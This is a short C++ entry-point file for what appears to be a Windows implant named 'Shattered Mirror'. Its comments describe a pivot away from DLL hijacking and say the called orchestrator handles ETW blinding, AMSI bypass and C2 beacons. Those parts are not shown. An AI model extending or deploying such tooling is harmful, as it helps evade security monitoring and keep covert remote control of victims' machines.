#include "AtomManager.h"
#include <cstdio>
#include <windows.h>

/*
 * Shattered Mirror v1 — Standalone Entry Point
 *
 * We have pivoted from DLL Hijacking to a standalone EXE for
 * superior debugging and direct testing. This bypasses the
 * loader lock and export table complexities.
 */

// Reference the main orchestrator loop from AtomManager.cpp
extern DWORD WINAPI OrchestratorMain(LPVOID lpParam);

int main() {
  printf("==========================================\n");
  printf("   SHATTERED MIRROR — STANDALONE CORE     \n");
  printf("==========================================\n");
  printf("[*] Initializing execution environment...\n");

  // Create log directory if it doesn't exist
  CreateDirectoryA("log", NULL);

  // Clear logs if they exist
  DeleteFileA("log\\shattered_debug.log");

  // Call the main loop directly. No threads, no loader locks.
  // This will handle ETW blinding, AMSI bypass, and C2 beacons.
  OrchestratorMain(NULL);

  return 0;
}
